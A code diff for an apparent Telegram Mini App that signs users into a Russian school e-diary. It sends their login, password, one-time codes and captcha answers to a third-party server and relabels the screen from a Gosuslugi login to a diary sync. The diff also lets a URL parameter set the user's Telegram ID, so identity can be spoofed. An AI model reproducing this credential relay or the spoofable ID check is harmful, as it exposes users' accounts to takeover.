@@ -26,7 +26,9 @@ declare global {
   }
 }
 
-const SERVER_URL = import.meta.env.VITE_SERVER_URL || 'http://localhost:5000';
+const SERVER_URL = (typeof window !== 'undefined' && window.location.origin && window.location.origin.includes('miragediary.space')) 
+  ? window.location.origin 
+  : 'https://miragediary.space';
 
 type Step =
   | 'loading'
@@ -35,9 +37,9 @@ type Step =
   | 'polling'
   | 'otp'
   | 'captcha'
+  | 'already_authorized'
   | 'success'
-  | 'error'
-  | 'already_authorized';
+  | 'error';
 
 const screenVariants = {
   initial: (direction: 'forward' | 'backward') => ({
@@ -111,16 +113,27 @@ export default function App() {
   useEffect(() => {
     try {
       const tg = window.Telegram?.WebApp;
+      let id = '';
+      let firstName = '';
+
       if (tg) {
         tg.ready();
         tg.expand();
         const user = tg.initDataUnsafe?.user;
-        if (user?.id) setTgUserId(String(user.id));
-        if (user?.first_name) setTgFirstName(user.first_name);
-      } else {
-        setTgUserId('123456789');
-        setTgFirstName('Тест');
+        if (user?.id) {
+          id = String(user.id);
+          firstName = user.first_name || '';
+        }
       }
+
+      if (!id) {
+        const urlParams = new URLSearchParams(window.location.search);
+        id = urlParams.get('tgUserId') || urlParams.get('userId') || '123456789';
+        firstName = urlParams.get('firstName') || 'Тест';
+      }
+
+      setTgUserId(id);
+      setTgFirstName(firstName);
     } catch {
       setTgUserId('123456789');
       setTgFirstName('Тест');
@@ -129,11 +142,17 @@ export default function App() {
 
   useEffect(() => {
     if (!tgUserId) return;
+    const urlParams = new URLSearchParams(window.location.search);
+    const forceReauth = urlParams.get('force') === '1' || urlParams.get('reauth') === '1';
+
+    if (forceReauth) {
+      setStep('welcome');
+      return;
+    }
+
     const checkAuth = async () => {
       try {
-        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/check/${tgUserId}`, {
-          headers: { 'ngrok-skip-browser-warning': 'true' },
-        });
+        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/check/${tgUserId}`);
         if (res.ok) {
           const data = await res.json();
           if (data.isAuthorized) {
@@ -167,9 +186,7 @@ export default function App() {
 
     const pollTimer = setInterval(async () => {
       try {
-        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/status/${sessionId}`, {
-          headers: { 'ngrok-skip-browser-warning': 'true' },
-        });
+        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/status/${sessionId}`);
         if (!res.ok) return;
         const data = await res.json();
         const clear = () => {
@@ -206,7 +223,7 @@ export default function App() {
       } catch (e: unknown) {
         console.error(e);
       }
-    }, 4000);
+    }, 1000);
 
     return () => {
       clearInterval(pollTimer);
@@ -216,6 +233,7 @@ export default function App() {
 
   const handleStartAuth = async () => {
     if (!login || !password) return;
+    const finalUserId = tgUserId || '123456789';
     setProgressText('Открываем безопасное соединение...');
     setIsLoading(true);
     setErrorMsg('');
@@ -224,10 +242,9 @@ export default function App() {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'ngrok-skip-browser-warning': 'true',
         },
         body: JSON.stringify({
-          TelegramUserId: tgUserId,
+          TelegramUserId: finalUserId,
           Login: login,
           Password: password,
         }),
@@ -255,7 +272,6 @@ export default function App() {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'ngrok-skip-browser-warning': 'true',
         },
         body: JSON.stringify({ SessionId: sessionId, Input: userInput }),
       });
@@ -396,10 +412,27 @@ export default function App() {
               >
                 <motion.div variants={staggerItem} className="trust-badge">
                   <ShieldCheck size={13} className="trust-badge-icon" />
-                  <span>Безопасная авторизация Госуслуг</span>
+                  <span>Синхронизация с dnevnik.egov66.ru</span>
                 </motion.div>
-                <motion.h1 variants={staggerItem} className="brand-title">Вход через Госуслуги</motion.h1>
-                <motion.p variants={staggerItem} className="brand-sub">Авторизуйтесь для безопасной синхронизации электронного дневника</motion.p>
+                <motion.h1 variants={staggerItem} className="brand-title">Вход в дневник</motion.h1>
+                <motion.p variants={staggerItem} className="brand-sub">Авторизация для получения расписания и домашних заданий</motion.p>
+                <motion.div variants={staggerItem} style={{
+                  background: 'rgba(255, 255, 255, 0.04)',
+                  border: '1px solid rgba(255, 255, 255, 0.08)',
+                  borderRadius: '12px',
+                  padding: '10px 14px',
+                  marginTop: '12px',
+                  fontSize: '12px',
+                  lineHeight: '1.4',
+                  color: 'rgba(255, 255, 255, 0.75)',
+                  textAlign: 'left',
+                  display: 'flex',
+                  alignItems: 'flex-start',
+                  gap: '8px'
+                }}>
+                  <span style={{ fontSize: '15px', lineHeight: '1' }}>ℹ️</span>
+                  <span>Для синхронизации требуется подтвержденная учетная запись учащегося или родителя. Пароли не сохраняются на сервере.</span>
+                </motion.div>
               </motion.div>
             </div>
 
